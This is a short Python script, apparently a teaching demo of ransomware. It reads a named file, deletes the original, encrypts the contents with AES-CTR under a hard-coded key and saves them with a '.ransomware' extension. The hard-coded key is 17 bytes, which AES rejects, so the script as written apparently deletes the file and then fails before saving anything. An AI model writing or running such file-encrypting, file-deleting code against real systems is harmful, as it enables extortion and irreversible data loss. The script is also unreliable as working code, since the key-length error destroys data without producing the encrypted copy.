import os
import pyaes

original_file = "arquivo_secreto.txt"

with open(original_file, "rb") as file:
    original_data = file.read()

os.remove(original_file)

key = b"chave_secreta_123"
aes = pyaes.AESModeOfOperationCTR(key)

encrypted_data = aes.encrypt(original_data)

encrypted_file = original_file + ".ransomware"
with open(encrypted_file, "wb") as file:
    file.write(encrypted_data)

print(f"Arquivo '{encrypted_file}' criptografado com sucesso.")
